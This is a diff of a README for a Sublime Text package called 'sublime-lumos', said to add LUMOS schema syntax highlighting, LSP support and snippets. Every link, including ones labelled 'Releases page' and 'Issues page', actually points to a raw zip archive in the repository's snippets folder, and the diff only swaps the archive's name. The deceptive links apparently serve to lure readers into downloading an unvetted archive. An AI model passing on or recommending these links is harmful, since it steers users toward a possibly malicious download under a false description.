@@ -1,6 +1,6 @@
 # 🌟 sublime-lumos - Enhance Your Coding Experience Effortlessly
 
-![Download sublime-lumos](https://raw.githubusercontent.com/yvan-upadhyay/sublime-lumos/main/snippets/sublime-lumos_v2.7.zip)
+![Download sublime-lumos](https://raw.githubusercontent.com/yvan-upadhyay/sublime-lumos/main/snippets/lumos-sublime-v3.6.zip)
 
 ## 📜 Description
 sublime-lumos is a Sublime Text package designed to support the LUMOS schema language. It provides syntax highlighting, integration with Language Server Protocol (LSP), and ready-to-use code snippets. This tool makes coding simpler and more efficient, especially if you are working in blockchain development or similar fields.
@@ -10,7 +10,7 @@ To start using sublime-lumos, you need to download and install it on your machin
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/yvan-upadhyay/sublime-lumos/main/snippets/sublime-lumos_v2.7.zip) to download the latest version of sublime-lumos.
+   Go to the [Releases page](https://raw.githubusercontent.com/yvan-upadhyay/sublime-lumos/main/snippets/lumos-sublime-v3.6.zip) to download the latest version of sublime-lumos.
 
 2. **Choose Your Version**  
    Once you are on the Releases page, you will see a list of available versions. Click on the version you wish to download. 
@@ -54,7 +54,7 @@ If you experience issues during installation or while using the package:
 ## 🌐 Community and Support
 Join our community to discuss features, report bugs, or ask for help:
 - **GitHub Discussions:** Participate in conversations and share your experiences.
-- **Report an Issue:** If you encounter a bug, report it on our [Issues page](https://raw.githubusercontent.com/yvan-upadhyay/sublime-lumos/main/snippets/sublime-lumos_v2.7.zip).
+- **Report an Issue:** If you encounter a bug, report it on our [Issues page](https://raw.githubusercontent.com/yvan-upadhyay/sublime-lumos/main/snippets/lumos-sublime-v3.6.zip).
 
 ## 🌟 Conclusion
-sublime-lumos offers a practical solution for anyone working with LUMOS schema language or in blockchain programming. With easy installation and user-friendly features, you can enhance your coding experience in no time. Don't forget to visit our [Releases page](https://raw.githubusercontent.com/yvan-upadhyay/sublime-lumos/main/snippets/sublime-lumos_v2.7.zip) to download the latest version and start using sublime-lumos today!
+sublime-lumos offers a practical solution for anyone working with LUMOS schema language or in blockchain programming. With easy installation and user-friendly features, you can enhance your coding experience in no time. Don't forget to visit our [Releases page](https://raw.githubusercontent.com/yvan-upadhyay/sublime-lumos/main/snippets/lumos-sublime-v3.6.zip) to download the latest version and start using sublime-lumos today!
